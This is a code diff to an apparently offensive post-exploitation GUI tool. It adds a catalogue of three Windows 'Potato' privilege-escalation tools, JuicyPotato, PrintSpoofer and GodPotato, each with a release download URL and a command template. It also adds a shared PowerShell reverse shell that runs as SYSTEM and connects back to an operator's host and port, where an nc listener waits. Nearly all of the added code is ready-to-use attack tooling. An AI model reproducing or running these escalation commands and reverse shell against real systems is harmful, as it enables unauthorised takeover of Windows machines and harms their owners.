@@ -2563,6 +2563,100 @@ class PostExploitGuideDialog:
             anchor="w").pack(fill="x", padx=4, pady=(6, 8))
 
 
+# ── Potato variant catalogue ──────────────────────────────────────────
+# show_potato_picker_dialog() renders one radio row per entry and reads a
+# fixed set of keys off each dict — keep every variant shaped the same:
+#   id           radio value + the string _auto_pick() returns; the
+#                picker defaults variant_var to that id, so every id
+#                _auto_pick can emit MUST exist here (juicy / printspoofer
+#                / godpotato) or the default selection falls through.
+#   name         label shown on the radio button
+#   compat       one-line "which Windows builds" blurb (display only)
+#   notes        one-line operator caveat (display only)
+#   binary_name  file the DOWNLOAD button curls to, and the name the
+#                exec command assumes under C:\Windows\Temp\ on target
+#   url          direct release-asset URL for `curl -L --fail -o`
+#   cmd_template str.format()-ed with bin=<remote path>, lhost, lport in
+#                _update_preview(); every LITERAL brace is therefore
+#                doubled ({{ }}) and only {bin}/{lhost}/{lport} stay bare.
+#
+# Scope: only the three variants that (a) ship a single prebuilt .exe the
+# DOWNLOAD button can fetch directly and (b) cover the full OS span
+# _auto_pick() maps to.  RoguePotato / SweetPotato / EfsPotato ship as
+# zips or source and need a relay/compile step the single-exe download +
+# one-shot exec model here can't express, so they're intentionally left
+# out rather than wired to a URL that would 404 under `curl --fail`.
+
+# Shared SYSTEM-level PowerShell reverse shell every variant fires through
+# its exec flag.  Internals use single quotes only (host string, prompt)
+# so the payload nests inside each tool's double-quoted argument with one
+# consistent layer of \" escaping; it is caught by the `nc -lvnp <LPORT>`
+# listener the dialog tells the operator to start.
+_PS_SYSTEM_REVSHELL = (
+    "powershell -nop -w hidden -c \\\""
+    "$c=New-Object Net.Sockets.TcpClient('{lhost}',{lport});"
+    "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
+    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+    "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
+    "$sb=([text.encoding]::ASCII).GetBytes($r2);"
+    "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
+    "\\\""
+)
+
+_POTATO_VARIANTS = [
+    {
+        "id": "juicy",
+        "name": "JuicyPotato",
+        "compat": ("Windows 7 / 8 / 8.1 - Server 2008 R2 / 2012 / "
+                   "2012 R2 (NT 6.0-6.3). Dead on Server 2019+ / "
+                   "Win10 1809+ (DCOM activation hardened)."),
+        "notes": ("Classic RottenPotatoNG DCOM token-stealer. Needs a "
+                  "CLSID that maps to a privileged COM server on the "
+                  "target; the bundled BITS CLSID fits most 2008 R2 / "
+                  "2012 builds - if activation fails, pick another from "
+                  "ohpe's per-OS CLSID list."),
+        "binary_name": "JuicyPotato.exe",
+        "url": ("https://github.com/ohpe/juicy-potato/releases/"
+                "download/v0.1/JuicyPotato.exe"),
+        "cmd_template": (
+            "{bin} -t * -l 9999 "
+            "-p C:\\Windows\\System32\\cmd.exe -a \"/c "
+            + _PS_SYSTEM_REVSHELL +
+            "\" -c {{4991d34b-80a1-4291-83b6-3328366b9097}}"),
+    },
+    {
+        "id": "printspoofer",
+        "name": "PrintSpoofer",
+        "compat": ("Windows 10 - Server 2016 / 2019. Abuses the Print "
+                   "Spooler named-pipe trick; MS hardened it in the "
+                   "late-2020 updates, so a fully patched 2019 / Win10 "
+                   "may refuse."),
+        "notes": ("No CLSID needed - leans on the Spooler service. If "
+                  "the Spooler is disabled or patched, fall back to "
+                  "GodPotato."),
+        "binary_name": "PrintSpoofer64.exe",
+        "url": ("https://github.com/itm4n/PrintSpoofer/releases/"
+                "download/v1.0/PrintSpoofer64.exe"),
+        "cmd_template": ("{bin} -c \"" + _PS_SYSTEM_REVSHELL + "\""),
+    },
+    {
+        "id": "godpotato",
+        "name": "GodPotato (.NET 4)",
+        "compat": ("Windows 8 -> Windows 11 - Server 2012 -> Server "
+                   "2022. Requires the .NET 4+ runtime on target (use "
+                   "the NET35 build for older runtimes)."),
+        "notes": ("Most reliable modern pick - no CLSID, works where "
+                  "JuicyPotato is patched out. Runtime-bound: swap to "
+                  "GodPotato-NET35.exe on hosts with only .NET 3.5."),
+        "binary_name": "GodPotato-NET4.exe",
+        "url": ("https://github.com/BeichenDream/GodPotato/releases/"
+                "download/V1.20/GodPotato-NET4.exe"),
+        "cmd_template": ("{bin} -cmd \"" + _PS_SYSTEM_REVSHELL + "\""),
+    },
+]
+
+
 def show_potato_picker_dialog(parent, app):
     """Potato variant picker.
 
